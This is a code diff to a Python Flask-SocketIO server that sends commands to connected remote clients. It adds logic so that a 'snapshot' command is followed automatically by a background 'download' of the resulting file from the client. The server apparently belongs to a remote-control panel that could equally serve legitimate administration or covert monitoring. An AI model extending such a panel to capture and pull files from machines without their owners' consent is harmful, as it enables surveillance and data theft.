@@ -983,6 +983,24 @@ def handle_command(data):
             return
 
     result = send_command_to_client(client_id, command)
+    
+    if command == "snapshot" and result.get('success'):
+        response_text = result.get('response', '')
+        if response_text.startswith("SNAPSHOT_READY "):
+            filepath = response_text.split(" ", 1)[1].strip()
+            emit('command_response', {'success': True, 'response': f'Snapshot taken, starting download... ({filepath})', 'client_id': client_id, 'command': command})
+            
+            def do_snapshot_download():
+                dl_res = send_command_to_client(client_id, f'download {filepath}')
+                socketio.emit('command_response', {**dl_res, 'client_id': client_id, 'command': f'download {filepath}'}, namespace='/')
+                
+            threading.Thread(target=do_snapshot_download, daemon=True).start()
+            return
+            
+        elif response_text.startswith("Error:"):
+            # just pass through the error
+            pass
+
     emit('command_response', {**result, 'client_id': client_id, 'command': command})
 
 @app.route('/api/downloads/<filename>')
